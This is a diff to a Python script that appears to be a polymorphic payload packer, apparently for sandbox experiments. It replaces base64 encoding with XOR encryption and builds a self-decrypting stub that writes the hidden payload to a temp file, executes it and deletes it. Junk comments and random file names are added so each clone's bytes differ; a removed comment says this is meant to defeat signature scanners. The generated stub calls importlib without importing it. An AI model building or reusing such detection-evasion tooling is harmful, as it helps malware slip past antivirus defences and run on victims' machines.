@@ -10,23 +10,26 @@ from pathlib import Path
 
 # ---------- Paths ----------
 ROOT = Path(__file__).resolve().parent.parent  
-BOX  = ROOT / "sandbox"                               
+BOX  = ROOT / "sandbox"
+KEY_PATH = ROOT / "xor_key.txt"
 BOX.mkdir(exist_ok=True)
 
-# ---------- Read the payload ----------
-PAYLOAD = (ROOT / "payload.py").read_text()
+# ---------- Load XOR key ----------
+if not KEY_PATH.exists():
+    raise RuntimeError("Missing xor_key.txt. Please create it with your secret key.")
 
-# ---------- Encode payload in base 64 ----------
-# Base64 makes the body look like random text → every run gets a different string length 
-# Signature scanners built on raw byte patterns no longer match
-encoded = base64.b64encode(PAYLOAD.encode()).decode()
+key = KEY_PATH.read_text().strip().encode()
+
+# ---------- XOR encode payload ----------
+
+def xor_encode(data: bytes, key:bytes) -> bytes:
+    """XOR encode the data with the given key."""
+    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+PAYLOAD = (ROOT / "payload.py").read_bytes()
+cipher = xor_encode(PAYLOAD, key)
 
 # ---------- Build decrypt stub ----------
-
-# Store the decoded payload in a random variable
-# Pull 6 random characters from the set abc..xyz in the form of list
-# Join will make it into one string 
-random_var = ''.join(random.choices(string.ascii_lowercase, k=6))
 
 # Insert useless comments that will be ignored but do change the file's bytes
 junk_comm = "# " + ''.join(random.choices(string.ascii_letters + ' ', k=30))
@@ -34,17 +37,24 @@ junk_comm = "# " + ''.join(random.choices(string.ascii_letters + ' ', k=30))
 stub = textwrap.dedent(f"""
     {junk_comm}
     import base64, tempfile, subprocess, os
-    {random_var} = base64.b64decode('{encoded}').decode()
 
-    # Write decoded payload to a temp file
+    cipher = {list(cipher)}
+    key = '{key.decode()}'.encode()
+
+    def xor(data, key):
+        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
+
+
+    # Decode and write payload
+    payload = xor(bytes(cipher), key).decode()
     tmp = tempfile.NamedTemporaryFile('w', delete=False, suffix='.py')
-    tmp.write({random_var})
+    tmp.write(payload)
     tmp.close()
 
-    # Run the payload as a subprocess
-    subprocess.run(["python3", tmp.name])
+    spec = importlib.util.spec_from_file_location("pl", tmp.name)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
 
-    # Clean up temp file
     os.remove(tmp.name)
 """)
 
@@ -52,9 +62,6 @@ stub = textwrap.dedent(f"""
 clone_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + ".py"
 clone_path = BOX / clone_name
 clone_path.write_text(stub)
-
-# ---------- Execute the clone ----------
-#subprocess.run(["python3", str(clone_path)])
 
 # ---------- Log mutation ----------
 with open(BOX / "mutation.log", "a") as log:
